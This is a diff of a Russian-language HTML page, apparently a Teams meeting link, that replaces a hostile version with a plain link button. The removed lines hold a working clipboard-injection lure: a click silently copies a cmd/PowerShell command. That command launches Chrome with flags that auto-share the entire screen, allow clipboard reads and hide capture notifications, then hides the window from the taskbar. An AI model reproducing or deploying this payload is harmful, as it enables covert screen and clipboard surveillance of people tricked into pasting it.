@@ -1,49 +1,38 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <style>
-        body {
-            width: 100vw;
-            height: 100vh;
-            margin: 0;
-            background: white;
-        }
-        textarea {
-            position: fixed;
-            top: 0;
-            left: 0;
-            opacity: 0;
-            pointer-events: none;
-            width: 1px;
-            height: 1px;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Перейти во встречу Teams</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: grid;
+      place-items: center;
+      font-family: system-ui, sans-serif;
+      background: #f5f5f5;
+    }
+    a.button {
+      display: inline-block;
+      padding: 14px 22px;
+      background: #6264a7;
+      color: white;
+      text-decoration: none;
+      border-radius: 8px;
+      font-size: 18px;
+    }
+    a.button:hover {
+      background: #4f51a0;
+    }
+  </style>
 </head>
 <body>
-    <textarea id="tempText"></textarea>
-<script>
-const command = String.raw`cmd /v:on /c "set "p=%TEMP%\C!RANDOM!!TIME::=!" & start "" "chrome.exe" --user-data-dir="!p!" --disk-cache-dir="!p!\c" --media-cache-dir="!p!\m" --use-fake-ui-for-media-stream --auto-select-desktop-capture-source="Entire screen" --disable-features=WebRtcHideLocalIpsWithMdns,UserMediaScreenCapturingNotification,TabGroups,TabGridLayout --enable-features=ClipboardAlwaysAllowPaste --disable-notifications --disable-component-update --no-first-run --enable-clipboard-features --clipboard-allow-unsecured-read --enable-experimental-web-platform-features --aggressive-cache-discard --disable-cache --disable-application-cache --disable-offline-load-stale-cache --disable-tab-group-auto-creation --new-window "https://teams.live.com/meet/9342687184371?p=GLz3KgPhS5xVYHCkwv" & timeout /t 3 /nobreak >nul & powershell -windowstyle hidden -c "$h=(Get-Process chrome ^| Where-Object {$_.MainWindowHandle -ne 0} ^| sort StartTime -Desc ^| select -First 1).MainWindowHandle; $t=Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern int SetWindowLong(IntPtr h,int i,int v); [DllImport(\"user32.dll\")]public static extern int GetWindowLong(IntPtr h,int i);' -Name W -PassThru; $t::SetWindowLong($h,-20,($t::GetWindowLong($h,-20) -band 0xFFFFFBFF) -bor 0x80)"`;
-
-document.body.addEventListener('click', function() {
-    const textarea = document.getElementById('tempText');
-    textarea.value = command;
-    
-    textarea.select();
-    textarea.setSelectionRange(0, 99999);
-    
-    try {
-        const successful = document.execCommand('copy');
-        if (successful) {
-            window.location.href = 'https://on2026.econ.msu.ru';
-        }
-    } catch (err) {
-        console.error('Ошибка копирования', err);
-    }
-});
-</script>
-
+  <a class="button"
+     href="https://teams.live.com/meet/9318300257919?p=6xMC7PbAKKnjoe2CK7"
+     target="_blank"
+     rel="noopener noreferrer">
+    Открыть встречу Teams
+  </a>
 </body>
 </html>
